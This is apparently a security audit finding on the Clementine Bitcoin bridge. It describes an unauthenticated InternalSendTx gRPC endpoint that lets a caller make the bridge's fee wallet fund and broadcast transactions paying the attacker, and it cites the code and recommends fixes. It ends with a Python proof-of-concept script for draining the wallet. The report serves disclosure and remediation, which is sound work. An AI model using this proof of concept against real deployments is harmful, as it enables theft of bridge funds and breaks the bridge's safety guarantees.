### Title
Unauthenticated `InternalSendTx` on Aggregator gRPC Allows Arbitrary Bitcoin Transaction Broadcast with Wallet-Funded RBF, Enabling Bridge Fee-Wallet Drain — (`File: core/src/rpc/aggregator.rs`)

---

### Summary

The `InternalSendTx` gRPC endpoint on the aggregator accepts an arbitrary caller-supplied raw Bitcoin transaction and a caller-controlled `FeeType`, then unconditionally queues it for broadcast. The aggregator is documented and deployed with `client_verification = false`, which causes the `Noop` interceptor to be applied — meaning **no client certificate is required** to call this endpoint. When the attacker sets `fee_type = RBF`, the tx-sender calls `fund_raw_transaction` on the attacker's transaction with `add_inputs: true`, causing Bitcoin Core's wallet to add its own UTXOs as inputs to cover the attacker's outputs. The wallet signs and broadcasts the funded transaction, transferring funds from the bridge's fee-bumping wallet to the attacker.

---

### Finding Description

**Step 1 — No authentication on the aggregator.**

`create_aggregator_grpc_server` calls `create_grpc_server` with the aggregator's `BridgeConfig`. Inside `create_grpc_server`, the interceptor is chosen based on `config.client_verification`:

```rust
// core/src/servers.rs:114-138
let service = InterceptedService::new(
    service,
    if config.client_verification {
        OnlyAggregatorAndSelf { aggregator_cert, our_cert: client_cert }
    } else {
        Noop   // ← applied when client_verification = false
    },
);
```

The documentation explicitly states: *"The aggregator does not enforce client certificates but does use TLS for encryption."* The code confirms this: when `client_verification` is `true` on the aggregator, a `tracing::warn!` is emitted as if it were unusual. The `Noop` interceptor passes every request unconditionally:

```rust
// core/src/rpc/interceptors.rs:30
Interceptors::Noop => Ok(req),
```

**Step 2 — `InternalSendTx` accepts and queues any raw transaction.**

```rust
// core/src/rpc/aggregator.rs:1270-1311
async fn internal_send_tx(&self, request: Request<clementine::SendTxRequest>)
    -> Result<Response<Empty>, Status>
{
    let send_tx_req = request.into_inner();
    let fee_type = send_tx_req.fee_type();          // ← caller-controlled
    let signed_tx: bitcoin::Transaction = send_tx_req
        .raw_tx.ok_or(...)?.try_into()?;            // ← arbitrary tx bytes
    self.tx_sender
        .insert_try_to_send(&mut dbtx, None, &signed_tx,
            fee_type.try_into()?,                   // ← RBF, CPFP, NoFunding
            None, &[], &[], &[], &[])
        .await.map_to_status()?;
    ...
}
```

No validation of the transaction's inputs, outputs, or relationship to any bridge state is performed.

**Step 3 — RBF path calls `fund_raw_transaction`, adding wallet inputs.**

When `fee_type = RBF` (proto value `2`), the tx-sender's `send_rbf_tx` is invoked. On the first attempt (no prior RBF txid in mempool), it calls:

```rust
// crates/clementine-tx-sender/src/rbf.rs (initial RBF send path)
let funded_tx = self.rpc.fund_raw_transaction(
    &tx_bytes,
    Some(&FundRawTransactionOptions {
        add_inputs: Some(true),   // ← wallet adds its own UTXOs
        ...
        replaceable: Some(true),
        fee_rate: Some(...),
    }),
    None,
).await?;
let signed_tx = self.rpc.sign_raw_transaction_with_wallet(&funded_tx.hex, ...).await?;
self.rpc.send_raw_transaction(&final_tx).await?;
```

Bitcoin Core's `fund_raw_transaction` with `add_inputs: true` adds wallet-owned UTXOs as inputs until the transaction's outputs are fully covered. If the attacker's transaction has zero inputs and one output to their address, the wallet adds all necessary inputs, signs, and broadcasts — transferring funds from the bridge's wallet to the attacker.

**Step 4 — `FeeType` enum confirms RBF is a valid caller-supplied value.**

```
// core/src/rpc/clementine.proto:133-139
enum FeeType {
  UNSPECIFIED = 0;
  CPFP        = 1;
  RBF         = 2;      // ← attacker uses this
  NO_FUNDING  = 3;
  RBF_WTXID_GRIND = 4;
}
```

---

### Impact Explanation

The bridge's Bitcoin Core wallet is the sole source of funds for fee-bumping all bridge transactions (kickoff, challenge, disprove, reimburse, payout). An attacker who drains it:

- Prevents the bridge from CPFP/RBF-bumping time-sensitive transactions (challenge, disprove, reimburse).
- Causes those transactions to miss their Bitcoin timelock windows.
- Allows operators to be falsely slashed (disprove window missed) or prevents honest operators from reclaiming collateral (reimburse window missed).
- Locks or loses bridged BTC.

The wallet drain is repeatable: the attacker can submit many small-output transactions in rapid succession until the wallet is empty.

---

### Likelihood Explanation

- The aggregator is designed to be reachable by the `clementine-backend` service and is documented as not enforcing client certificates — this is the default, not a misconfiguration.
- The `automation` feature (required for `internal_send_tx` to be active) is enabled in production builds.
- The attacker needs only network access to the aggregator's gRPC port and the ability to construct a valid Bitcoin transaction serialization (trivially done with any Bitcoin library).
- No bridge keys, operator credentials, or privileged access are required.

---

### Recommendation

1. **Enforce caller authentication on `InternalSendTx`**: Even on the aggregator, require a client certificate for this endpoint. The `is_internal` check already exists in the interceptor — it just needs `client_verification = true` to be enforced on the aggregator, or a separate per-method auth layer.
2. **Validate transaction content**: Before queuing, verify that the submitted transaction's inputs spend known bridge-controlled UTXOs (e.g., check against the DB). Reject transactions with zero inputs or outputs to unknown addresses.
3. **Restrict allowed `FeeType` values**: `InternalSendTx` should only accept `NO_FUNDING` or `CPFP` (which do not call `fund_raw_transaction` with wallet-owned inputs). Reject `RBF` and `RBF_WTXID_GRIND` from this endpoint.
4. **Consider removing the endpoint from the public aggregator API**: Replace it with an internal-only mechanism (e.g., Unix socket or in-process call) that is not reachable from the network.

---

### Proof of Concept

```python
# Pseudocode — attacker drains bridge wallet via InternalSendTx + RBF
import grpc
from clementine_pb2 import SendTxRequest, RawSignedTx, FeeType
from clementine_pb2_grpc import ClementineAggregatorStub

# 1. Connect to aggregator (no client cert required)
channel = grpc.secure_channel("aggregator:17000", grpc.ssl_channel_credentials())
stub = ClementineAggregatorStub(channel)

# 2. Craft a tx: 0 inputs, 1 output to attacker's address (0.001 BTC)
#    Bitcoin serialization of: version=2, vin=[], vout=[{value=100000, scriptPubKey=<attacker_p2wpkh>}], locktime=0
attacker_tx_bytes = build_tx(inputs=[], outputs=[{"value": 100_000, "address": ATTACKER_ADDR}])

# 3. Call InternalSendTx with fee_type=RBF (value=2)
req = SendTxRequest(
    raw_tx=RawSignedTx(raw_tx=attacker_tx_bytes),
    fee_type=2  # RBF
)
stub.InternalSendTx(req)  # succeeds — no auth check

# 4. tx-sender calls fund_raw_transaction(add_inputs=true) on attacker's tx
#    → wallet adds its own UTXOs to cover 100_000 sat + fees
#    → wallet signs and broadcasts
#    → attacker receives 100_000 sat from bridge wallet

# 5. Repeat until wallet is drained
```

**Corrupted value**: The bridge's Bitcoin Core wallet balance, which is the operational reserve for fee-bumping all bridge transactions. Once drained, all pending bridge transactions (challenge, disprove, reimburse) lose their fee-bumping capability, breaking bridge safety and liveness with direct material fund impact. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** core/src/rpc/aggregator.rs (L1270-1311)
```rust
    async fn internal_send_tx(
        &self,
        request: Request<clementine::SendTxRequest>,
    ) -> Result<Response<Empty>, Status> {
        #[cfg(not(feature = "automation"))]
        {
            Err(Status::unimplemented("Automation is not enabled"))
        }
        #[cfg(feature = "automation")]
        {
            let send_tx_req = request.into_inner();
            let fee_type = send_tx_req.fee_type();
            let signed_tx: bitcoin::Transaction = send_tx_req
                .raw_tx
                .ok_or(Status::invalid_argument("Missing raw_tx"))?
                .try_into()?;
            tracing::warn!(
                "Internal send tx rpc called with feetype: {:?}, tx hex: {}",
                fee_type,
                bitcoin::consensus::encode::serialize_hex(&signed_tx)
            );

            let mut dbtx = self.db.begin_transaction().await?;
            self.tx_sender
                .insert_try_to_send(
                    &mut dbtx,
                    None,
                    &signed_tx,
                    fee_type.try_into()?,
                    None,
                    &[],
                    &[],
                    &[],
                    &[],
                )
                .await
                .map_to_status()?;
            dbtx.commit()
                .await
                .map_err(|e| Status::internal(format!("Failed to commit db transaction: {e}")))?;
            Ok(Response::new(Empty {}))
        }
```

**File:** core/src/servers.rs (L106-138)
```rust
            let tls_config = if config.client_verification {
                ServerTlsConfig::new()
                    .identity(server_identity)
                    .client_ca_root(client_ca)
            } else {
                ServerTlsConfig::new().identity(server_identity)
            };

            let service = InterceptedService::new(
                service,
                if config.client_verification {
                    let client_cert = CertificateDer::from_pem_file(&config.client_cert_path)
                        .wrap_err(format!(
                            "Failed to read client certificate from {}",
                            config.client_cert_path.display()
                        ))?
                        .to_owned();

                    let aggregator_cert =
                        CertificateDer::from_pem_file(&config.aggregator_cert_path)
                            .wrap_err(format!(
                                "Failed to read aggregator certificate from {}",
                                config.aggregator_cert_path.display()
                            ))?
                            .to_owned();

                    OnlyAggregatorAndSelf {
                        aggregator_cert,
                        our_cert: client_cert,
                    }
                } else {
                    Noop
                },
```

**File:** core/src/servers.rs (L293-317)
```rust
pub async fn create_aggregator_grpc_server(
    config: BridgeConfig,
) -> Result<(std::net::SocketAddr, oneshot::Sender<()>), BridgeError> {
    let addr: std::net::SocketAddr = format!("{}:{}", config.host, config.port)
        .parse()
        .wrap_err("Failed to parse address")?;
    let aggregator_server = AggregatorServer::new(config.clone()).await?;
    aggregator_server.start_background_tasks().await?;

    let svc = ClementineAggregatorServer::new(aggregator_server)
        .max_encoding_message_size(config.grpc.max_message_size)
        .max_decoding_message_size(config.grpc.max_message_size);

    if config.client_verification {
        tracing::warn!("Client verification is enabled on aggregator gRPC server",);
    }

    let (server_addr, shutdown_tx) =
        create_grpc_server(addr.into(), svc, "Aggregator", &config).await?;

    match server_addr {
        ServerAddr::Tcp(socket_addr) => Ok((socket_addr, shutdown_tx)),
        _ => Err(BridgeError::ConfigError("Expected TCP address".into())),
    }
}
```

**File:** core/src/rpc/interceptors.rs (L22-32)
```rust
impl Interceptor for Interceptors {
    #[allow(clippy::result_large_err)]
    fn call(&mut self, req: Request<()>) -> Result<Request<()>, Status> {
        match self {
            Interceptors::OnlyAggregatorAndSelf {
                our_cert,
                aggregator_cert,
            } => only_aggregator_and_self(req, our_cert, aggregator_cert),
            Interceptors::Noop => Ok(req),
        }
    }
```

**File:** crates/clementine-tx-sender/src/rbf.rs (L557-620)
```rust
    pub async fn send_rbf_tx(
        &self,
        try_to_send_id: u32,
        mut tx: Transaction,
        tx_metadata: Option<TxMetadata>,
        fee_rate: FeeRateKvb,
        rbf_signing_info: Option<RbfSigningInfo>,
        current_tip_height: u32,
        needs_wtxid_grind: bool,
    ) -> Result<()> {
        tracing::debug!(?tx_metadata, "Sending RBF tx",);

        tracing::debug!(?try_to_send_id, "Attempting to send.");

        let _ = self
            .db
            .update_tx_debug_sending_state(try_to_send_id, "preparing_rbf", true)
            .await;

        let rbf_txids = self
            .db
            .list_rbf_txids_for_id(None, try_to_send_id)
            .await
            .wrap_err("Failed to list RBF txids")?;

        // We check all bumps here but technically as wallet bumpfee rpcs do not use unsafe utxos, if the last rbf txid is
        // evicted all should be evicted as well. Only while funding the first rbf tx can unsafe outputs be used.
        let mut bump_from_txid = None;
        for txid in rbf_txids {
            match self.rpc.get_mempool_entry(&txid).await {
                Ok(_) => {
                    bump_from_txid = Some(txid);
                    break;
                }
                Err(e) => {
                    // If not in mempool, either evicted or already confirmed/replaced.
                    if !e.to_string().contains("Transaction not in mempool") {
                        return Err(eyre!("Failed to get mempool entry for {txid}: {e}").into());
                    }

                    if let Ok(tx_info) = self.rpc.get_transaction(&txid, None).await {
                        if tx_info.info.blockhash.is_some() && tx_info.info.confirmations > 0 {
                            tracing::debug!(
                                ?try_to_send_id,
                                "RBF tx {txid} already confirmed, skipping bump"
                            );
                            return Ok(());
                        }
                    }
                }
            }
        }

        // cache the leaf hash for script path spends
        let cached_leaf_hash = match &rbf_signing_info {
            Some(rbf_signing_info) => match &rbf_signing_info.spend_path {
                RbfSigningSpendPath::ScriptPath { script, .. } => Some(TapLeafHash::from_script(
                    ScriptBuf::from_bytes(script.clone()).as_script(),
                    LeafVersion::TapScript,
                )),
                _ => None,
            },
            None => None,
        };
```

**File:** core/src/rpc/clementine.proto (L133-139)
```text
enum FeeType {
  UNSPECIFIED = 0;
  CPFP = 1;
  RBF = 2;
  NO_FUNDING = 3;
  RBF_WTXID_GRIND = 4;
}
```

**File:** core/src/rpc/clementine.proto (L671-674)
```text
message SendTxRequest {
  RawSignedTx raw_tx = 1;
  FeeType fee_type = 2;
}
```
